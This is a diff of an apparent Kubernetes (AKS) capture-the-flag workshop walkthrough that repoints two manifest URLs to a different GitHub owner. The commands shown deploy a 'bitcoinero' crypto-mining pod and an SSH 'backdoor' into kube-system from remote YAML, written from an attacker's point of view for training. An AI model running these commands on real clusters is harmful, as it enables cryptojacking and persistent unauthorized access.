@@ -158,13 +158,13 @@ kubectl auth can-i create pods
 
 It looks like we have hit the jackpot! Let's see if we can start mining some crypto.
 ```console
-kubectl apply -f https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml; sleep 10; kubectl get pods
+kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml; sleep 10; kubectl get pods
 ```
 
 We can see the bitcoinero pod running, starting to generate a small but steady stream of cryptocurrency. But we need to take a few more steps to protect our access to this lucrative opportunity. Let's deploy an SSH server on the cluster to give us a backdoor in case we lose our current access later.
 
 ```console
-kubectl apply -n kube-system -f https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/scenario_1/backdoor.yaml
+kubectl apply -n kube-system -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/backdoor.yaml
 ```
 
 Wait ~10 seconds for the Public IP to be exposed
